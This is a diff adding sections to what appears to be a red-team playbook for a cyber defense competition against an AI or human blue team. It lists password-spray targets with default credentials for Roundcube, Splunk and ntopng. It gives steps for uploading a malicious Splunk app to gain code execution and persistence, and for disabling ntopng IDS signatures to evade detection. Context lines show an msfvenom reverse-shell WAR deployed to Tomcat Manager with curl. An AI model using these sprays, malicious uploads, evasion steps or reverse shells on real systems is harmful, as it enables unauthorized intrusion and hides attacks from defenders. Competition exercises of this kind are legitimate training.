@@ -52,6 +52,34 @@ IMPORTANT: Do NOT change the `admin:WaterIsWet??` password on compromised WordPr
 
 The SSH spray window closes at approximately T+3min against the AI blue team (T+15-17min against human teams observed in quals). Execute SSH sprays FIRST and FAST.
 
+### 2026-inv5 New Credential Targets (from invitational traffic analysis)
+
+Three new services confirmed in inv5 that accept credential attacks. These should be sprayed simultaneously with the quals targets at T=0 if the inv5 layout is detected.
+
+1. Roundcube Webmail (moomail.[domain] on .86 hosts, port 80):
+   Login endpoint: POST /?_task=login
+   Fields: _user=[username]&_pass=[password]&_timezone=[tz]&_task=login&_action=login
+   Observed spray: pyoung/admin, pyoung/password, pyoung/root
+   Try: admin/admin, admin/password, admin/changeme, [scenario-usernames]/[theme-word]
+
+2. Splunk SIEM (Work1.[domain] on .60 hosts, port 8000):
+   Login: POST /en-US/account/login or direct web form
+   Default credentials: admin/changeme (Splunk factory default — frequently not changed)
+   Also try: admin/admin, admin/password, admin/splunk
+   Post-login attack path: upload malicious Splunk app via /en-US/manager/appinstall/upload_app
+   (gives code execution on Splunk server — high value target)
+
+3. ntopng Network Monitor (.2 hosts, port 443 or 3000):
+   Default credentials: admin/admin (ntopng factory default)
+   Also try: admin/password, ntopng/ntopng
+   High value: ntopng gives full network visibility and IDS control
+   Post-login technique: disable IDS signatures via /lua/rest/v2/disable/check.lua
+   Specific signature to disable: ndpi_http_suspicious_header (blocks HTTP attack detection)
+
+**inv5 Username Format Change:** lowercase first-initial + lastname (example: pyoung). This differs from the quals format (FIRSTNAME_LASTNAME, all-caps). At Regionals, try BOTH formats during initial spray. The format may change again.
+
+**Scoring role accounts:** moomoo, ceo — these are scoring-only accounts and not valid for admin login. Do not waste spray attempts on these.
+
 ## Quick-Win Service Exploits
 
 These are the 30-second checks that yield immediate access on common CCDC services. Run these against every target in Phase 1 before moving to more complex attacks.
@@ -71,6 +99,28 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<jumpbox-IP> LPORT=4444 -f war -o s
 curl -u tomcat:tomcat -T shell.war "http://<target>:8080/manager/text/deploy?path=/shell"
 curl http://<target>:8080/shell/
 ```
+
+### Splunk SIEM as Initial Access / Persistence Vector (confirmed in 2026-inv5)
+
+If Splunk is running on .60 hosts (port 8000), it is a high-priority target with two attack paths:
+
+Attack Path A — Malicious Splunk App Upload (requires valid credentials):
+1. Log into Splunk web UI with admin/changeme (default) or admin/password
+2. Navigate to Manage Apps -> Install app from file
+3. URL path: /en-US/manager/appinstall/upload_app
+4. Upload a .spl file (tar.gz with metadata/app.conf and commands)
+5. Verify installation at /en-US/splunkd/__raw/services/apps/local/[appname]
+6. App runs as the Splunk service account (often root or splunk user with significant privileges)
+Result: code execution on the Splunk server
+
+Attack Path B — Splunk Search Head Command Injection:
+If Splunk has a configured search peer with shell command transforms, arbitrary commands can be run via | sendalert or custom search commands.
+
+Detection risk: LOW (app upload looks like normal admin activity)
+Noise level: LOW (single multipart POST to upload, then GET to verify)
+Persistence value: HIGH (Splunk restarts maintain the malicious app)
+
+Rate this as Tier A when Splunk is found with default credentials — it is a quick-win equivalent to Tomcat Manager but with better persistence properties.
 
 ### FTP Anonymous Access (Port 21)
 
